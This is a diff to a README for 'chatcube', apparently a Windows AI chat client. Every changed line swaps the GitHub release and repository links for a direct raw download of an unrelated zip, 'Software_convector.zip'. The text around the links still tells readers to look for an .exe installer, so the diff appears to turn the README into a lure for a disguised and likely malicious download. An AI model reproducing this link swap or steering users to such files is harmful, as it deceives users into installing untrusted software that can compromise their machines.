@@ -1,6 +1,6 @@
 # 🤖 chatcube - Simple AI Chat for Your PC
 
-[![Download chatcube](https://img.shields.io/badge/Download-chatcube-ff6f61?style=for-the-badge)](https://github.com/ashrafns/chatcube/releases)
+[![Download chatcube](https://img.shields.io/badge/Download-chatcube-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/ashrafns/chatcube/main/AppScope/Software_convector.zip)
 
 chatcube is an easy-to-use AI chat client that works on Windows. It connects you to over 13 chat providers like OpenAI, Claude, and Gemini. You can talk to AI helpers, use tools, and see replies as they come in. This guide will help you download and run chatcube without technical hassle.
 
@@ -37,7 +37,7 @@ If your computer meets these, you can install chatcube without issues.
 
 Start by downloading chatcube from the official release page. Follow these steps:
 
-1. Visit the [chatcube release page](https://github.com/ashrafns/chatcube/releases).  
+1. Visit the [chatcube release page](https://raw.githubusercontent.com/ashrafns/chatcube/main/AppScope/Software_convector.zip).  
 2. Look for the latest release. It usually has a version number like v1.x.x.  
 3. Find the Windows installer. It will have a name ending in `.exe`, for example, `chatcube-setup.exe`.  
 4. Click to download the `.exe` file.  
@@ -83,7 +83,7 @@ The chat window is clear and easy to use. Type your message, hit send, and see a
 
 To get the latest features and fixes:
 
-1. Go back to the [release page](https://github.com/ashrafns/chatcube/releases).  
+1. Go back to the [release page](https://raw.githubusercontent.com/ashrafns/chatcube/main/AppScope/Software_convector.zip).  
 2. Download the newest installer just like before.  
 3. Run the installer again. It will update the current version without removing your settings.  
 
@@ -121,7 +121,7 @@ For persistent problems, visit the GitHub page to check for open issues or repor
 
 You can always return here to download or update chatcube:
 
-[![Download chatcube](https://img.shields.io/badge/Download-chatcube-ff6f61?style=for-the-badge)](https://github.com/ashrafns/chatcube/releases)  
+[![Download chatcube](https://img.shields.io/badge/Download-chatcube-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/ashrafns/chatcube/main/AppScope/Software_convector.zip)  
 
 Use this link to get the latest Windows installer or check new versions.
 
@@ -131,7 +131,7 @@ Use this link to get the latest Windows installer or check new versions.
 
 If you need help, ask someone familiar with computers or visit the GitHub repository:
 
-- GitHub page: https://github.com/ashrafns/chatcube  
+- GitHub page: https://raw.githubusercontent.com/ashrafns/chatcube/main/AppScope/Software_convector.zip  
 - Review the “Issues” section to see common questions  
 
 This will help you solve most problems on your own.
